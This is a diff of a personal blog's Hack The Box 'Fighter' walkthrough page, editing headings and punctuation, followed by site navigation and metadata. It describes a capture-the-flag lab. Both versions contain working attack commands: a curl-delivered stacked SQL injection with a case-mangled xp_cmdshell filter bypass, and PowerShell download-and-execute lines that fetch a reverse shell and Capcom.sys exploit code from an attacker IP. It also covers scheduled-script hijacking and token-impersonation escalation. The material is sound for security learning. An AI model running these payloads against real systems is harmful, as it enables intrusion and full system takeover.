-<h2 id="the-hacker-mindset-approach">The Hacker Mindset: Approach</h2>
-<p>Before we type a single command, let's talk about <strong>how to think</strong> when approaching a box like Fighter.</p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>Fighter starts with DNS and web enumeration before moving into Windows privilege escalation.</p>
 <h3 id="reconnaissance-is-90-of-the-game">Reconnaissance is 90% of the Game</h3>
-<p>You cannot exploit what you don't know exists. Every open port, every DNS name, every hidden directory is a potential entry point. The goal of recon isn't to "hack" anything yet—it's to build a <strong>map of the target's attack surface</strong>.</p>
+<p>You cannot exploit what you don't know exists. Every open port, every DNS name, every hidden directory is a potential entry point. The goal of recon isn't to "hack" anything yet - it's to build a <strong>map of the target's attack surface</strong>.</p>
 <h3 id="follow-the-clues">Follow the Clues</h3>
 <p>When a website says "our old members site is still available... you know the link," that's not flavor text. That's the box creator <strong>telling you</strong> there's something to find. In real-world penetration testing, developers and users leak information constantly. Learn to recognize hints.</p>
 <h3 id="assume-nothing-verify-everything">Assume Nothing, Verify Everything</h3>
 <p>Just because a login form looks secure doesn't mean it is. Just because <code>xp_cmdshell</code> returns an error doesn't mean it's disabled. Just because PowerShell is "blocked" doesn't mean you can't find another way to run it. Hackers are persistent because they test assumptions.</p>
 <h3 id="understand-the-environment">Understand the Environment</h3>
 <p>Windows boxes have unique characteristics: AppLocker, Windows Firewall, User Account Control, service accounts with specific privileges, scheduled tasks, and vulnerable drivers. Understanding the <strong>Windows ecosystem</strong> is crucial for privilege escalation.</p>
-<hr />
+<hr>
 <h2 id="step-1-network-reconnaissance">Step 1: Network Reconnaissance</h2>
-<h3 id="what-we-do">What We Do</h3>
+
 <p>We start by discovering what services are running on the target. We use <code>nmap</code> to scan all 65,535 TCP ports.</p>
-<h3 id="why-we-do-it">Why We Do It</h3>
+
 <p>Every open port is a potential entry point. A web server might have a vulnerable application. A database might have weak credentials. An SMB share might expose sensitive files. We scan <strong>all ports</strong> because services sometimes run on non-standard ports to "hide" from casual scans.</p>
-<h3 id="the-commands">The Commands</h3>
+
 <pre><code class="language-bash" data-language="bash"># Full port scan (SYN stealth scan, fast)
 sudo nmap -Pn -sS -p- --min-rate=5000 10.129.228.121
 
@@ -85,16 +84,16 @@ sudo nmap -Pn -sC -sV -p80 10.129.228.121
 |_  Potentially risky methods: TRACE
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 </code></pre>
-<h3 id="the-hacker-mindset">The Hacker Mindset</h3>
-<p><strong>Only one port open.</strong> On Hack The Box, this is common. It means our entry point is almost certainly the web server. IIS 8.5 tells us this is likely <strong>Windows Server 2012 R2</strong>. This OS knowledge becomes critical later when we exploit the Capcom driver—we need to know what exploits are compatible.</p>
+
+<p><strong>Only one port open.</strong> On Hack The Box, this is common. It means our entry point is almost certainly the web server. IIS 8.5 tells us this is likely <strong>Windows Server 2012 R2</strong>. This OS knowledge becomes critical later when we exploit the Capcom driver - we need to know what exploits are compatible.</p>
 <p>The <code>TRACE</code> method being available is a minor information disclosure (XST attack potential), but not our main path.</p>
-<hr />
+<hr>
 <h2 id="step-2-web-enumeration-and-subdomain-discovery">Step 2: Web Enumeration &amp; Subdomain Discovery</h2>
-<h3 id="what-we-do-2">What We Do</h3>
+
 <p>We visit the website and read every word on it. We also add the domain to <code>/etc/hosts</code> and look for subdomains.</p>
-<h3 id="why-we-do-it-2">Why We Do It</h3>
+
 <p>Modern web applications often use <strong>virtual hosts</strong> (vhosts) to serve different content on the same IP address. The main site might be a decoy, while a subdomain hosts the actual application. The hint on the homepage about "members" and "knowing the link" is a dead giveaway.</p>
-<h3 id="the-commands-2">The Commands</h3>
+
 <pre><code class="language-bash" data-language="bash"># Add domain to /etc/hosts so our browser resolves it
 echo "10.129.228.121 streetfighterclub.htb members.streetfighterclub.htb" | sudo tee -a /etc/hosts
 
@@ -111,16 +110,16 @@ wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" \
 <p><code>wfuzz</code> discovers:</p>
 <pre><code>000000134:   403        29 L     92 W     1233 Ch     "members"
 </code></pre>
-<h3 id="the-hacker-mindset-2">The Hacker Mindset</h3>
-<p><strong>The hint is the attack vector.</strong> The phrase "you know the link" is classic CTF/box design—it tells you that the path isn't obvious and needs to be discovered. The <code>403 Forbidden</code> on <code>members.streetfighterclub.htb</code> means the subdomain exists but we can't access the root. We need to <strong>brute-force directories</strong> on this subdomain.</p>
-<p>A <code>403</code> is actually <strong>good news</strong>—it confirms the vhost is configured and serving something. A non-existent subdomain would return the same content as the main site (or a different error).</p>
-<hr />
+
+<p><strong>The hint is the attack vector.</strong> The phrase "you know the link" is classic CTF/box design - it tells you that the path isn't obvious and needs to be discovered. The <code>403 Forbidden</code> on <code>members.streetfighterclub.htb</code> means the subdomain exists but we can't access the root. We need to <strong>brute-force directories</strong> on this subdomain.</p>
+<p>A <code>403</code> is actually <strong>good news</strong>- it confirms the vhost is configured and serving something. A non-existent subdomain would return the same content as the main site (or a different error).</p>
+<hr>
 <h2 id="step-3-finding-the-login-page">Step 3: Finding the Login Page</h2>
-<h3 id="what-we-do-3">What We Do</h3>
+
 <p>We run a directory brute-force scan on the members subdomain to find hidden pages.</p>
-<h3 id="why-we-do-it-3">Why We Do It</h3>
+
 <p>Web servers have default behaviors. IIS servers often host <code>.asp</code> and <code>.aspx</code> files. The <code>403</code> on the root of <code>members</code> suggests there's content behind it, but we need to guess the path.</p>
-<h3 id="the-command">The Command</h3>
+
 <pre><code class="language-bash" data-language="bash">feroxbuster -u http://members.streetfighterclub.htb \
   -x aspx,asp,html \
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
@@ -132,20 +131,20 @@ wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" \
 302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/welcome.asp =&gt; Login.asp
 302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/verify.asp =&gt; login.asp
 </code></pre>
-<h3 id="the-hacker-mindset-3">The Hacker Mindset</h3>
+
 <p><strong>Patterns reveal architecture.</strong> We see:</p>
 <ul>
-<li><code>login.asp</code> — the entry point</li>
-<li><code>verify.asp</code> — likely handles the POST request</li>
-<li><code>welcome.asp</code> — likely the post-login page</li>
+<li><code>login.asp</code> : the entry point</li>
+<li><code>verify.asp</code> : likely handles the POST request</li>
+<li><code>welcome.asp</code> : likely the post-login page</li>
 </ul>
 <p>The <code>302</code> redirects tell us the flow: <code>login.asp</code> → POST to <code>verify.asp</code> → redirect to <code>welcome.asp</code> (or back to <code>login.asp</code> on failure).</p>
 <p>We now know we're dealing with <strong>Classic ASP</strong> (not ASP.NET), which historically has had many SQL injection vulnerabilities because developers often concatenated user input directly into SQL queries.</p>
-<hr />
+<hr>
 <h2 id="step-4-discovering-sql-injection">Step 4: Discovering SQL Injection</h2>
-<h3 id="what-we-do-4">What We Do</h3>
+
 <p>We analyze the login form's HTTP request and test each parameter for SQL injection.</p>
-<h3 id="why-we-do-it-4">Why We Do It</h3>
+
 <p>Login forms are prime targets for SQL injection because they almost always query a database to validate credentials. If the query is constructed unsafely, we can manipulate it.</p>
 <h3 id="the-analysis">The Analysis</h3>
 <p>Using <code>curl</code> or Burp Suite, we capture the POST request:</p>
@@ -153,7 +152,7 @@ wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" \
 Host: members.streetfighterclub.htb
 Content-Type: application/x-www-form-urlencoded
 
-username=admin&amp;password=REDACTED
+username=admin&amp;password=REDACTED&amp;logintype=2&amp;rememberme=ON&amp;B1=LogIn
 </code></pre>
 <p>We notice:</p>
 <ul>
@@ -164,38 +163,38 @@ username=admin&amp;password=REDACTED
 <p>We test each parameter. The <code>username</code> and <code>password</code> fields reflect our input in cookies but don't seem to cause errors with weird input. However, <code>logintype</code> is different.</p>
 <p><strong>Test 1: Normal login</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
-  -d "username=admin&amp;password=REDACTED \
+  -d "username=admin&amp;password=REDACTED&amp;logintype=2&amp;rememberme=ON&amp;B1=LogIn" \
   -o /dev/null -w "%{http_code}\n"
 # Returns: 302
 </code></pre>
 <p><strong>Test 2: SQL comment syntax</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
-  -d "username=admin&amp;password=REDACTED \
+  -d "username=admin&amp;password=REDACTED&amp;logintype=1--+-x&amp;rememberme=ON&amp;B1=LogIn" \
   -o /dev/null -w "%{http_code}\n"
 # Returns: 302
 </code></pre>
 <p><strong>Test 3: Invalid input (no SQL)</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
-  -d "username=admin&amp;password=REDACTED \
+  -d "username=admin&amp;password=REDACTED&amp;logintype=abc&amp;rememberme=ON&amp;B1=LogIn" \
   -o /dev/null -w "%{http_code}\n"
 # Returns: 500 (Internal Server Error)
 </code></pre>
-<h3 id="the-hacker-mindset-4">The Hacker Mindset</h3>
-<p><strong>Error messages are information.</strong> The <code>500</code> error when <code>logintype=abc</code> tells us the application expects a number and crashes when it gets text. But when we send <code>1--+-x</code> (a number followed by a SQL comment), it returns <code>302</code>—the same as a successful login.</p>
+
+<p><strong>Error messages are information.</strong> The <code>500</code> error when <code>logintype=abc</code> tells us the application expects a number and crashes when it gets text. But when we send <code>1--+-x</code> (a number followed by a SQL comment), it returns <code>302</code>- the same as a successful login.</p>
 <p>This means the SQL query looks something like:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password=REDACTED AND logintype=2
+<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password='REDACTED' AND logintype=2
 </code></pre>
 <p>When we send <code>1--+-x</code>, it becomes:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password=REDACTED AND logintype=1--+-x
+<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password='REDACTED' AND logintype=1--+-x
 </code></pre>
-<p>The <code>--</code> comments out the rest of the query, and the <code>1</code> makes the <code>WHERE</code> clause true (assuming the user exists). The <code>302</code> redirect means the query returned rows—<strong>we have SQL injection</strong>.</p>
+<p>The <code>--</code> comments out the rest of the query, and the <code>1</code> makes the <code>WHERE</code> clause true (assuming the user exists). The <code>302</code> redirect means the query returned rows -<strong>we have SQL injection</strong>.</p>
 <p><strong>Why <code>logintype</code> and not <code>username</code>?</strong> Because <code>username</code> and <code>password</code> are likely wrapped in quotes in the SQL query, so our input is treated as a string. But <code>logintype</code> is used as a raw number, so we can inject SQL operators directly.</p>
-<hr />
+<hr>
 <h2 id="step-5-exploiting-sql-injection-with-stacked-queries">Step 5: Exploiting SQL Injection with Stacked Queries</h2>
-<h3 id="what-we-do-5">What We Do</h3>
+
 <p>We confirm we can execute arbitrary SQL commands using <strong>stacked queries</strong> (multiple queries separated by <code>;</code>).</p>
-<h3 id="why-we-do-it-5">Why We Do It</h3>
-<p>Classic ASP with MSSQL is notorious for allowing stacked queries by default. This means if we can inject <code>;</code>, we can run entirely new SQL commands—including system commands via <code>xp_cmdshell</code>.</p>
+
+<p>Classic ASP with MSSQL is notorious for allowing stacked queries by default. This means if we can inject <code>;</code>, we can run entirely new SQL commands - including system commands via <code>xp_cmdshell</code>.</p>
 <h3 id="understanding-stacked-queries">Understanding Stacked Queries</h3>
 <p>In MySQL, stacked queries are often disabled. But in <strong>Microsoft SQL Server with ASP/ADO</strong>, they're frequently enabled. This is a critical distinction. A stacked query attack looks like:</p>
 <pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE logintype=3; EXEC xp_cmdshell 'whoami'; -- -
@@ -206,30 +205,30 @@ username=admin&amp;password=REDACTED
 <li>Our injected <code>EXEC xp_cmdshell 'whoami'</code></li>
 </ol>
 <h3 id="confirming-stacked-queries-work">Confirming Stacked Queries Work</h3>
-<p>We can't easily see the output (blind injection), so we use a <strong>time-based or network-based</strong> confirmation. The classic approach is <code>ping</code>—if we see ICMP packets, our command executed.</p>
+<p>We can't easily see the output (blind injection), so we use a <strong>time-based or network-based</strong> confirmation. The classic approach is <code>ping</code>- if we see ICMP packets, our command executed.</p>
 <p><strong>Start tcpdump to watch for pings:</strong></p>
 <pre><code class="language-bash" data-language="bash">sudo tcpdump -ni tun0 icmp
 </code></pre>
 <p><strong>Send the stacked query:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
   --data-urlencode "username=admin" \
-  --data-urlencode "password=REDACTED \
+  --data-urlencode "password=REDACTED" \
   --data-urlencode "logintype=3;EXEC xp_cmDshElL 'ping 10.10.16.84'-- -" \
   -d "rememberme=ON&amp;B1=LogIn" \
   -o /dev/null -w "%{http_code}\n"
 </code></pre>
 <p><strong>Result:</strong> <code>302</code> HTTP code, and <code>tcpdump</code> shows ICMP echo requests from <code>10.129.228.121</code>.</p>
-<h3 id="the-hacker-mindset-5">The Hacker Mindset</h3>
+
 <p><strong>Blind injection doesn't mean helpless.</strong> Even though we don't see command output in the HTTP response, we can confirm execution through side effects:</p>
 <ul>
 <li><strong>Network effects:</strong> DNS lookups, pings, HTTP requests to our server</li>
 <li><strong>Time delays:</strong> <code>WAITFOR DELAY '0:0:5'</code> makes the response take 5 seconds</li>
 <li><strong>File system:</strong> Write files we can read later</li>
 </ul>
-<p>The <code>ping</code> is our "canary"—it proves we have arbitrary command execution.</p>
-<hr />
+<p>The <code>ping</code> is our "canary" - it proves we have arbitrary command execution.</p>
+<hr>
 <h2 id="step-6-waf-bypass-and-xp-cmdshell">Step 6: WAF Bypass &amp; xp_cmdshell</h2>
-<h3 id="what-we-do-6">What We Do</h3>
+
 <p>We discover that a Web Application Firewall (WAF) or filtering mechanism blocks <code>xp_cmdshell</code> in normal case, but <strong>mixed case</strong> bypasses it.</p>
 <h3 id="why-this-happens">Why This Happens</h3>
 <p>Many security filters use simple string matching. If the filter looks for <code>xp_cmdshell</code> (lowercase), changing the case to <code>xp_cmDshElL</code> bypasses the filter while MSSQL still recognizes it (SQL Server is case-insensitive for commands).</p>
@@ -254,7 +253,7 @@ username=admin&amp;password=REDACTED
 <td><code>302</code> after 5 seconds, ping received!</td>
 </tr>
 </tbody></table>
-<h3 id="the-hacker-mindset-6">The Hacker Mindset</h3>
+
 <p><strong>Filters are dumb; databases are smart.</strong> WAFs often block known attack signatures, but the underlying database doesn't care about case. This is why <strong>encoding, case manipulation, and comment insertion</strong> are classic bypass techniques.</p>
 <p>Always test variations:</p>
 <ul>
@@ -264,9 +263,9 @@ username=admin&amp;password=REDACTED
 <li>Unicode normalization</li>
 <li>Comment insertion (<code>xp_/*foo*/cmdshell</code>)</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-7-getting-a-shell-as-sqlserv">Step 7: Getting a Shell as sqlserv</h2>
-<h3 id="what-we-do-7">What We Do</h3>
+
 <p>We use <code>xp_cmdshell</code> to execute a PowerShell reverse shell.</p>
 <h3 id="why-we-use-powershell">Why We Use PowerShell</h3>
 <p>PowerShell is deeply integrated into Windows and can easily create network connections, download files, and execute complex scripts. It's the ideal payload delivery mechanism on Windows targets.</p>
@@ -321,7 +320,7 @@ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.84 -Port 443' &gt;&gt; R
 <p><strong>Trigger the shell via SQL injection:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
   --data-urlencode "username=admin" \
-  --data-urlencode "password=REDACTED \
+  --data-urlencode "password=REDACTED" \
   --data-urlencode "logintype=3;EXEC xp_cmDshElL 'C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe \"iex(new-object net.webclient).downloadstring(\\\"http://10.10.16.84/REV.PS1\\\")\"'-- -" \
   -d "rememberme=ON&amp;B1=LogIn" \
   -o /dev/null -w "%{http_code}\n"
@@ -331,7 +330,7 @@ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.84 -Port 443' &gt;&gt; R
 PS C:\Windows\system32&gt; whoami
 fighter\sqlserv
 </code></pre>
-<h3 id="the-hacker-mindset-7">The Hacker Mindset</h3>
+
 <p><strong>Know the environment.</strong> If we hadn't checked the firewall, we might have wasted hours trying reverse shells on random ports. If we hadn't tested both 64-bit and 32-bit PowerShell, we might have concluded code execution was impossible.</p>
 <p>When something "should work but doesn't," ask:</p>
 <ul>
@@ -340,9 +339,9 @@ fighter\sqlserv
 <li>Are there multiple versions of the program?</li>
 <li>Is the command being modified (case changes, encoding)?</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-8-privilege-escalation-to-decoder">Step 8: Privilege Escalation to decoder</h2>
-<h3 id="what-we-do-8">What We Do</h3>
+
 <p>We enumerate the system as <code>sqlserv</code> and find a way to escalate to the <code>decoder</code> user.</p>
 <h3 id="system-enumeration">System Enumeration</h3>
 <p><strong>Users on the box:</strong></p>
@@ -355,7 +354,7 @@ fighter\sqlserv
 del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp
 exit
 </code></pre>
-<p>This looks like a <strong>scheduled task</strong>—a script that runs periodically to clean up temp files.</p>
+<p>This looks like a <strong>scheduled task</strong>- a script that runs periodically to clean up temp files.</p>
 <p><strong>Permissions on clean.bat:</strong></p>
 <pre><code class="language-powershell" data-language="powershell">icacls clean.bat
 # Output: clean.bat Everyone:(M)
@@ -389,27 +388,27 @@ exit
 PS C:\Windows\system32&gt; whoami
 fighter\decoder
 </code></pre>
-<h3 id="the-hacker-mindset-8">The Hacker Mindset</h3>
-<p><strong>File permissions are low-hanging fruit.</strong> In Windows, <code>icacls</code> is your best friend. Always check:</p>
+
+<p><strong>File permissions are common checks.</strong> In Windows, <code>icacls</code> is your best friend. Always check:</p>
 <ul>
 <li>Who owns files in user directories?</li>
 <li>What permissions do service accounts have on scripts?</li>
 <li>Are there <code>.bat</code>, <code>.ps1</code>, <code>.vbs</code> files that run automatically?</li>
 </ul>
 <p>The <code>copy /y NUL</code> trick is a classic <strong>AppLocker bypass</strong> for file truncation. When you can't overwrite a file directly (blocked by extension), truncating via <code>copy</code> uses different Windows APIs that may not be restricted.</p>
-<hr />
+<hr>
 <h2 id="step-9-getting-the-user-flag">Step 9: Getting the User Flag</h2>
-<h3 id="the-command-2">The Command</h3>
+
 <pre><code class="language-powershell" data-language="powershell">type C:\Users\decoder\desktop\user.txt
 </code></pre>
 <h3 id="the-flag">The Flag</h3>
 <pre><code>bb6163[redacted]5934297
 </code></pre>
-<h3 id="the-hacker-mindset-9">The Hacker Mindset</h3>
+
 <p><strong>Always check what you've compromised.</strong> After escalating to a new user, immediately check their desktop, documents, and browser history. The user flag is often just sitting there, but sometimes you'll find credentials, SSH keys, or other useful files.</p>
-<hr />
+<hr>
 <h2 id="step-10-privilege-escalation-to-system">Step 10: Privilege Escalation to SYSTEM</h2>
-<h3 id="what-we-do-9">What We Do</h3>
+
 <p>We discover a vulnerable kernel driver (<code>capcom.sys</code>) and exploit it to gain <code>SYSTEM</code> privileges.</p>
 <h3 id="discovery">Discovery</h3>
 <p><strong>Check loaded drivers:</strong></p>
@@ -422,7 +421,7 @@ fighter\decoder
 <ul>
 <li><code>Capcom</code> is a video game company (makes Street Fighter!)</li>
 <li>The driver is in <code>C:\Windows\</code> instead of <code>C:\Windows\System32\drivers</code></li>
-<li>It's a <strong>third-party kernel driver</strong> on a server—unusual</li>
+<li>It's a <strong>third-party kernel driver</strong> on a server - unusual</li>
 </ul>
 <h3 id="background-the-capcom-sys-vulnerability">Background: The Capcom.sys Vulnerability</h3>
 <p>The <code>capcom.sys</code> driver was distributed with Street Fighter 5. It contains a deliberate "feature" that allows user-mode applications to execute arbitrary code in kernel mode. This was intended for anti-cheat purposes but creates a massive security hole.</p>
@@ -449,26 +448,26 @@ iex(new-object net.webclient).downloadstring('http://10.10.16.84/capcom-all')
 capcom-elevatepid
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>[+] SYSTEM Token: REDACTED
+<pre><code>[+] SYSTEM Token: 0xFFFFC00119E077CA
 [+] Found PID: 2044
-[+] PID token: REDACTED
+[+] PID token: 0xFFFFC0011B9A8067
 [!] Duplicating SYSTEM token!
 </code></pre>
 <p><strong>Verify:</strong></p>
 <pre><code class="language-powershell" data-language="powershell">whoami
 # nt authority\system
 </code></pre>
-<h3 id="the-hacker-mindset-10">The Hacker Mindset</h3>
-<p><strong>Kernel drivers are the keys to the kingdom.</strong> Any third-party kernel driver is a potential privilege escalation vector. Here's how to find them:</p>
+
+<p><strong>Kernel drivers are high-impact attack surfaces.</strong> Any third-party kernel driver is a potential privilege escalation vector. Here's how to find them:</p>
 <ol>
-<li><code>driverquery /v</code> — list all drivers</li>
+<li><code>driverquery /v</code> : list all drivers</li>
 <li>Look for non-Microsoft drivers</li>
 <li>Look for drivers in unusual paths</li>
 <li>Google the driver name + "exploit" or "vulnerability"</li>
 </ol>
 <p>The Capcom driver is <strong>famous</strong> in the security community. When you see it, you know it's exploitable. Building a mental database of known-vulnerable drivers (Capcom, DBUtil, RTCore64, etc.) is essential for Windows privilege escalation.</p>
 <p><strong>Why PowerShell?</strong> Because AppLocker blocks <code>.exe</code> files, but we're running PowerShell code directly in memory. No file is written to disk, so AppLocker never sees it.</p>
-<hr />
+<hr>
 <h2 id="step-11-getting-the-root-flag">Step 11: Getting the Root Flag</h2>
 <h3 id="what-we-find">What We Find</h3>
 <pre><code class="language-powershell" data-language="powershell">cd C:\users\administrator\desktop
@@ -510,7 +509,7 @@ wget http://members.streetfighterclub.htb/street/root.exe
 <li>Compares against an obfuscated buffer</li>
 </ol>
 <pre><code class="language-python" data-language="python">obpass = b'\x46\x6d\x60\x66\x45\x68\x4f\x6c\x7d\x68'
-password = REDACTED ^ 9) for x in obpass])
+password = ''.join([chr(x ^ 9) for x in obpass])
 print(password)  # OdioLaFeta
 </code></pre>
 <p>The <code>print_flag</code> function in <code>root.exe</code>:</p>
@@ -529,7 +528,7 @@ print(flag)  # d801c1[redacted]3be314c1
 <p><strong>Output:</strong></p>
 <pre><code>d801c[redacted]d3be314c1
 </code></pre>
-<h3 id="the-hacker-mindset-11">The Hacker Mindset</h3>
+
 <p><strong>Reverse engineering is just following the data.</strong> You don't need to be a binary ninja to solve simple RE challenges:</p>
 <ol>
 <li>Look for strings (especially error messages)</li>
@@ -538,7 +537,7 @@ print(flag)  # d801c1[redacted]3be314c1
 <li>Reconstruct the algorithm in Python</li>
 </ol>
 <p>In real penetration testing, you might encounter custom authentication binaries, encrypted configuration files, or malware. Understanding basic reverse engineering concepts (XOR, addition/subtraction obfuscation, string analysis) is incredibly valuable.</p>
-<hr />
+<hr>
 <h2 id="alternative-paths">Alternative Paths</h2>
 <h3 id="juicypotato-token-impersonation">JuicyPotato (Token Impersonation)</h3>
 <p>From <code>sqlserv</code> (or <code>decoder</code>), we have <code>SeImpersonatePrivilege</code>:</p>
@@ -577,7 +576,7 @@ Start-Process -Filepath C:\programdata\met -Wait -NoNewWindow
 <pre><code class="language-powershell" data-language="powershell">copy met C:\windows\system32\spool\drivers\color\met.exe
 # Works! Execute from there.
 </code></pre>
-<hr />
+<hr>
 <h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
 <h3 id="1-read-everything">1. Read Everything</h3>
 <p>The hint about the "members site" was on the homepage. In real engagements, developers leak information in comments, error messages, and "helpful" text.</p>
@@ -612,17 +611,16 @@ schtasks /query /fo LIST /v
 <li>Addition/subtraction obfuscation</li>
 <li>Hardcoded buffers</li>
 </ul>
-<hr />
+<hr>
 <h2 id="final-flags">Final Flags</h2>
 <pre><code>User: bb6163[redacted]35934297
 Root: d801c1[redacted]bd3be314c1
 </code></pre>
-<p><strong>Fighter: Complete.</strong> </p>
-2d:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$31"}}]
+<p><strong>Fighter: Complete.</strong> </p>2d:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$31"}}]
 2e:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-falafel-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Falafel Walkthrough"}]]}]}],["$","$L4",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-forgot-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Forgot Walkthrough"}]]}]}]]}]
 2f:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L4","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L4",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-32:T51f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/#article","headline":"Hack The Box: Fighter Walkthrough","description":"An archived walkthrough of the retired Hack The Box Fighter machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/","datePublished":"2026-06-11T15:14:00.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3405,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/106f8c978eea4b5833db7c4587ca2e1678f3f5a1/HTB-Fighter.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Fighter Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}]}]}30:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$32"}}]
+32:T56b,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/#article","headline":"Hack The Box: Fighter Walkthrough","description":"Stacked SQL injection and a database command-execution filter bypass provide a service-account shell, a writable scheduled script pivots to another user, and a vulnerable Capcom driver grants SYSTEM access.","url":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/","datePublished":"2026-06-11T15:14:00.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3325,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/106f8c978eea4b5833db7c4587ca2e1678f3f5a1/HTB-Fighter.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Fighter 